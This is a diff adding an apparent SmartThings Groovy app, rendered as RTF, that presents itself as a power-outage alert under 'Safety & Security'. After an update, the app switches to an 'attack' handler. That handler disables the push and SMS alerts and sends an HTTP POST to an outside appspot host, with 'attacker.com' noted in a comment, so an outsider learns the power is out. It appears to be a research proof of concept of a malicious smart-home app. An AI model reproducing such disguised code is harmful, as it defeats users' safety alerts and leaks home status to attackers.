@@ -1,0 +1,124 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red64\green128\blue128;\red186\green33\blue33;\red153\green153\blue153;\red25\green23\blue124;\red0\green0\blue255;\red128\green0\blue128;\red187\green187\blue187;\red102\green102\blue102;\red136\green136\blue136;\red0\green128\blue0;\red170\green34\blue255;\red187\green102\blue34;\red187\green102\blue136;\red255\green0\blue0;\red0\green68\blue221;\red188\green122\blue0;\red0\green160\blue0;\red210\green65\blue58;\red0\green0\blue128;\red176\green0\blue64;\red125\green144\blue41;\red160\green0\blue0;\red136\green0\blue0;\red160\green160\blue0;}\f0{\cf1\i /**\par
+ *  shiqiPowersOutAlert\par
+ *\par
+ *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang\par
+ *\par
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except\par
+ *  in compliance with the License. You may obtain a copy of the License at:\par
+ *\par
+ *      http://www.apache.org/licenses/LICENSE-2.0\par
+ *\par
+ *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed\par
+ *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License\par
+ *  for the specific language governing permissions and limitations under the License.\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+    {\cf24 name:} {\cf2 "shiqiPowersOutAlert"}{\cf8 ,}\par
+    {\cf24 namespace:} {\cf2 "wsq"}{\cf8 ,}\par
+    {\cf24 author:} {\cf2 "Yunhan Jia & Shiqi Wang"}{\cf8 ,}\par
+    {\cf24 description:} {\cf2 "Alert me of power loss using motion detector&#39;s change from wired-power to battery-power. SmartThings hub and internet connection must be working! You can connect the hub and internet connection device (e.g. modem, router, etc.) to a battery backup power strip so that the motion detector and detect the loss and the hub and router will still have enough power to get the message out before they fail as well."}{\cf8 ,}\par
+    {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+    {\cf24 iconUrl:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png"}{\cf8 ,}\par
+    {\cf24 iconX2Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 ,}\par
+    {\cf24 iconX3Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 )}\par
+\par
+\par
+preferences {\cf8 \{}\par
+	section{\cf8 (}{\cf2 "When there is wired-power loss on..."}{\cf8 )} {\cf8 \{}\par
+			input {\cf2 "lockMotion"}{\cf8 ,} {\cf2 "capability.motionSensor"}{\cf8 ,} {\cf24 title:} {\cf2 "Where?"}\par
+	{\cf8 \}}\par
+	section{\cf8 (}{\cf2 "Via a push notification and a text message(optional)"}{\cf8 )}{\cf8 \{}\par
+    	input {\cf2 "pushAndPhone"}{\cf8 ,} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Send Text?"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 metadata:} {\cf8 [}{\cf24 values:} {\cf8 [}{\cf2 "Yes"}{\cf8 ,}{\cf2 "No"}{\cf8 ]}{\cf8 ]}\par
+		input {\cf2 "phone1"}{\cf8 ,} {\cf2 "phone"}{\cf8 ,} {\cf24 title:} {\cf2 "Phone Number (for Text, optional)"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+\par
+	{\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 installed}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+log{\cf8 .}{\cf21 debug} {\cf2 "installed"}\par
+	subscribe{\cf8 (}lockMotion{\cf8 ,} {\cf2 "powerSource.battery"}{\cf8 ,} onBatteryPowerHandler{\cf8 )}\par
+    subscribe{\cf8 (}lockMotion{\cf8 ,} {\cf2 "powerSource.powered"}{\cf8 ,} PoweredPowerHandler{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 updated}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 debug} {\cf2 "updated"}\par
+	unsubscribe{\cf8 (}{\cf8 )}\par
+	subscribe{\cf8 (}lockMotion{\cf8 ,} {\cf2 "powerSource.battery"}{\cf8 ,} onBatteryPowerAttackHandler{\cf8 )}\par
+    subscribe{\cf8 (}lockMotion{\cf8 ,} {\cf2 "powerSource.powered"}{\cf8 ,} PoweredPowerHandler{\cf8 )}\par
+{\cf8 \}}\par
+\par
+\par
+{\cf20 def} {\cf5 onBatteryPowerHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 trace} {\cf2 "$evt.value: $evt"}\par
+	{\cf20 def} msg {\cf8 =} {\cf2 "$\{lockMotion.label ?: lockMotion.name\} sensed Power is Out!"}\par
+    \par
+	log{\cf8 .}{\cf21 debug} {\cf2 "sending push for power is out"}\par
+	sendPush{\cf8 (}msg{\cf8 )}\par
+    \par
+    {\cf10\b if} {\cf8 (} phone1 {\cf8 &}{\cf8 &} pushAndPhone {\cf8 )} {\cf8 \{}\par
+    	log{\cf8 .}{\cf21 debug} {\cf2 "sending SMS to $\{phone1\}"}\par
+   	sendSms{\cf8 (}phone1{\cf8 ,} msg{\cf8 )}\par
+	{\cf8 \}}\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 onBatteryPowerAttackHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 trace} {\cf2 "$evt.value: $evt"}\par
+	{\cf20 def} msg {\cf8 =} {\cf2 "$\{lockMotion.label ?: lockMotion.name\} sensed Power is Out!"}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "attack"}\par
+    attack{\cf8 (}{\cf8 )}\par
+    {\cf1\i /*\par
+	log.debug "sending push for power is out"\par
+	sendPush(msg)\par
+    \par
+    if ( phone1 && pushAndPhone ) \{\par
+    	log.debug "sending SMS to $\{phone1\}"\par
+   	sendSms(phone1, msg)\par
+	\}\par
+    */}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 PoweredPowerHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+	log{\cf8 .}{\cf21 trace} {\cf2 "$evt.value: $evt"}\par
+	{\cf20 def} msg {\cf8 =} {\cf2 "$\{lockMotion.label ?: lockMotion.name\} sensed Power is Back On!"}\par
+    \par
+	log{\cf8 .}{\cf21 debug} {\cf2 "sending push for power is back on"}\par
+	sendPush{\cf8 (}msg{\cf8 )}\par
+    \par
+    {\cf10\b if} {\cf8 (} phone1 {\cf8 &}{\cf8 &} pushAndPhone {\cf8 )} {\cf8 \{}\par
+    	log{\cf8 .}{\cf21 debug} {\cf2 "sending SMS to $\{phone1\}"}\par
+    	sendSms{\cf8 (}phone1{\cf8 ,} msg{\cf8 )}\par
+	{\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 attack}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "http post"}\par
+    {\cf20 def} takeParams {\cf8 =} {\cf8 [}\par
+            {\cf24 uri:} {\cf2 "https://automated-lore-135923.appspot.com"}{\cf8 ,} {\cf1\i //"https://attacker.com"\par
+}            {\cf24 path:} {\cf2 ""}{\cf8 ,}\par
+            {\cf24 requestContentType:} {\cf2 "application/x-www-form-urlencoded"}{\cf8 ,}\par
+            {\cf24 body:} {\cf8 [}\par
+        		{\cf2 "lockMotion"}{\cf8 :} {\cf2 "out of battery!!!"}\par
+    		{\cf8 ]}\par
+      {\cf8 ]}\par
+      {\cf10\b try} {\cf8 \{}\par
+		httpPost{\cf8 (}takeParams{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+			{\cf10\b if} {\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "attack succeeded"}\par
+                log{\cf8 .}{\cf21 debug} resp{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+			{\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 error} {\cf2 "attack failed"}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}groovyx{\cf8 .}{\cf21 net}{\cf8 .}{\cf21 http}{\cf8 .}{\cf21 HttpResponseException} e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Send Message failure: $\{e\} with status: $\{e.statusCode\}"}\par
+		{\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 403}{\cf8 )} {\cf8 \{}\par
+			{\cf10\b throw} {\cf10\b new} {\cf5 RuntimeException}{\cf8 (}{\cf2 "Login Required"}{\cf8 )}\par
+		{\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 404}{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 error} {\cf2 "offline"}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}Exception e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Unexpected exception"}{\cf8 ,} e\par
+	 {\cf8 \}}\par
+   \par
+{\cf8 \}}\par
+}
